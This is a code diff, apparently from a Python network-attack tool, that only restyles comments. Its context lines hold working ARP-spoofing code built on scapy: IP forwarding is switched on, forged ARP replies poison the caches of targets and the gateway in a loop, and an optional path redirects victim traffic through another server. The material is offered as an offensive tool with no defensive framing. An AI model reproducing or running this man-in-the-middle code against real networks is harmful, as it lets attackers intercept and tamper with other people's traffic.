@@ -5,7 +5,7 @@ import scapy.all as scapy
 from . import STATUS, STOP_EVENT
 from .utils import log_msg, get_mac
 
-# --- CORE UTILITIES ---
+# Core Utilities
 def set_ip_forwarding(value):
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
@@ -17,7 +17,7 @@ def get_own_mac(interface):
     try: return scapy.get_if_hwaddr(interface)
     except: return None
 
-# --- ARP ATTACK FUNCTIONS ---
+# ARP Attack Functions
 def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
     packet = scapy.Ether(dst=target_mac, src=attacker_mac) / \
              scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
@@ -29,7 +29,7 @@ def restore(dest_ip, source_ip, dest_mac):
         packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])
 
-# --- MAIN ATTACK LOGIC ---
+# Main Attack Logic
 def run_attack_loop(target_ips, gateway_ip):
     STATUS["state"] = "RUNNING"
     STATUS["packets"] = 0
@@ -72,7 +72,7 @@ def run_attack_loop(target_ips, gateway_ip):
 
             if t_mac:
                 active_targets.append({"ip": t_ip, "mac": t_mac})
-                # --- [FIXED] ADDED MAC DISPLAY HERE ---
+                # Log target lock with MAC address
                 log_msg(f"    + Locked Target: {t_ip} [{t_mac}]")
             else:
                 log_msg(f"    - Failed to resolve: {t_ip}")
@@ -86,12 +86,12 @@ def run_attack_loop(target_ips, gateway_ip):
         while not STOP_EVENT.is_set():
             for target in active_targets:
                 try:
-                    # PATH A: Victim <-> Gateway
+                    # Path A: Victim <-> Gateway
                     spoof(target["ip"], gateway_ip, target["mac"], attacker_mac)
                     if gateway_mac and gateway_mac != "ff:ff:ff:ff:ff:ff":
                         spoof(gateway_ip, target["ip"], gateway_mac, attacker_mac)
 
-                    # PATH B: Victim <-> Server
+                    # Path B: Victim <-> Server
                     if use_triangle:
                         spoof(target["ip"], redirect_ip, target["mac"], attacker_mac)
                         spoof(redirect_ip, target["ip"], redirect_mac, attacker_mac)
